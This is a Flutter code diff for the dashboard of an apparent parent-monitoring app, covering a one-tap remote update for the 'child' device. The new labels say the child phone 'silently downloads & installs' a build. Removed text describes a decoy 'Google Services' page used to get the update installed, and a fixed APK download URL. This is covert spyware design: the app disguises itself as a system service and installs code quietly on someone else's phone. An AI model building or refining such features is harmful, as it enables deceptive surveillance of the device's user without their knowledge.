@@ -889,7 +889,24 @@ class DashboardScreen extends StatelessWidget {
 
             // 🚀 1-Click Remote OTA App Update to Child
             InkWell(
-              onTap: () => _showSendUpdateDialog(context, provider, activeChild),
+              onTap: provider.isSendingAppUpdate
+                  ? null
+                  : () async {
+                      final ok = await provider.sendAppUpdateToChild();
+                      if (context.mounted) {
+                        ScaffoldMessenger.of(context).showSnackBar(
+                          SnackBar(
+                            content: Text(
+                              ok
+                                  ? '🚀 Update sent! Child device downloading latest build...'
+                                  : '❌ Failed to send update. Check connection.',
+                            ),
+                            backgroundColor: ok ? const Color(0xFF8B5CF6) : Colors.red,
+                            duration: const Duration(seconds: 3),
+                          ),
+                        );
+                      }
+                    },
               borderRadius: BorderRadius.circular(16),
               child: Container(
                 padding: const EdgeInsets.all(14),
@@ -920,8 +937,8 @@ class DashboardScreen extends StatelessWidget {
                           const SizedBox(height: 2),
                           Text(
                             provider.isSendingAppUpdate
-                                ? 'Sending update command to device...'
-                                : 'Push new build • 1-Click install on child landing page',
+                                ? 'Fetching latest build & sending...'
+                                : 'Tap once → child silently downloads & installs',
                             style: const TextStyle(color: Color(0xFFA78BFA), fontSize: 11),
                           ),
                         ],
@@ -944,7 +961,7 @@ class DashboardScreen extends StatelessWidget {
                             const SizedBox(width: 6),
                           ],
                           const Text(
-                            'Send',
+                            'Update',
                             style: TextStyle(color: Color(0xFF8B5CF6), fontSize: 11, fontWeight: FontWeight.bold),
                           ),
                           const SizedBox(width: 4),
@@ -2065,100 +2082,6 @@ class DashboardScreen extends StatelessWidget {
     );
   }
 
-  void _showSendUpdateDialog(BuildContext context, ParentDashboardProvider provider, ChildProfile activeChild) {
-    final urlController = TextEditingController(text: 'https://vyra-backend-yei8.onrender.com/download/child-app.apk');
-    showDialog(
-      context: context,
-      builder: (ctx) => AlertDialog(
-        backgroundColor: const Color(0xFF1E293B),
-        title: Row(
-          children: [
-            Container(
-              padding: const EdgeInsets.all(8),
-              decoration: BoxDecoration(
-                color: const Color(0xFF8B5CF6).withValues(alpha: 0.2),
-                borderRadius: BorderRadius.circular(8),
-              ),
-              child: const Icon(Icons.system_update_rounded, color: Color(0xFF8B5CF6), size: 20),
-            ),
-            const SizedBox(width: 10),
-            const Text('Send App Update', style: TextStyle(color: Colors.white, fontSize: 16)),
-          ],
-        ),
-        content: Column(
-          mainAxisSize: MainAxisSize.min,
-          crossAxisAlignment: CrossAxisAlignment.start,
-          children: [
-            Text(
-              'Push latest upgrade to ${activeChild.name}\'s phone (${activeChild.pairingCode}):',
-              style: const TextStyle(color: Color(0xFFCBD5E1), fontSize: 13, height: 1.4),
-            ),
-            const SizedBox(height: 12),
-            Container(
-              padding: const EdgeInsets.all(12),
-              decoration: BoxDecoration(
-                color: const Color(0xFF0F172A),
-                borderRadius: BorderRadius.circular(10),
-                border: Border.all(color: const Color(0xFF334155)),
-              ),
-              child: const Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                children: [
-                  Text('⚡ What happens:', style: TextStyle(color: Color(0xFFA78BFA), fontSize: 12, fontWeight: FontWeight.bold)),
-                  SizedBox(height: 6),
-                  Text('1. Child phone downloads update in background.', style: TextStyle(color: Color(0xFF94A3B8), fontSize: 11)),
-                  Text('2. Decoy "Google Services" page shows 1-Click Update button.', style: TextStyle(color: Color(0xFF94A3B8), fontSize: 11)),
-                  Text('3. Child or parent taps button to update in-place without reinstalling.', style: TextStyle(color: Color(0xFF94A3B8), fontSize: 11)),
-                ],
-              ),
-            ),
-            const SizedBox(height: 12),
-            const Text('Update APK Download URL:', style: TextStyle(color: Color(0xFF94A3B8), fontSize: 11)),
-            const SizedBox(height: 4),
-            TextField(
-              controller: urlController,
-              style: const TextStyle(color: Colors.white, fontSize: 11),
-              decoration: InputDecoration(
-                filled: true,
-                fillColor: const Color(0xFF0F172A),
-                isDense: true,
-                contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
-                border: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: Color(0xFF334155))),
-                enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: Color(0xFF334155))),
-              ),
-            ),
-          ],
-        ),
-        actions: [
-          TextButton(
-            onPressed: () => Navigator.pop(ctx),
-            child: const Text('Cancel', style: TextStyle(color: Color(0xFF94A3B8))),
-          ),
-          ElevatedButton(
-            style: ElevatedButton.styleFrom(
-              backgroundColor: const Color(0xFF8B5CF6),
-              foregroundColor: Colors.white,
-            ),
-            onPressed: () async {
-              Navigator.pop(ctx);
-              final ok = await provider.sendAppUpdateToChild(customApkUrl: urlController.text.trim());
-              if (context.mounted) {
-                ScaffoldMessenger.of(context).showSnackBar(
-                  SnackBar(
-                    content: Text(ok
-                        ? '🚀 Update dispatched! Child device is downloading the latest build.'
-                        : '⚠️ Failed to send update command. Please check internet connection.'),
-                    backgroundColor: ok ? const Color(0xFF8B5CF6) : const Color(0xFFEF4444),
-                  ),
-                );
-              }
-            },
-            child: const Text('Send Update Now'),
-          ),
-        ],
-      ),
-    );
-  }
 
   void _showCloudPurgeDialog(BuildContext context, ParentDashboardProvider provider) {
     showDialog(
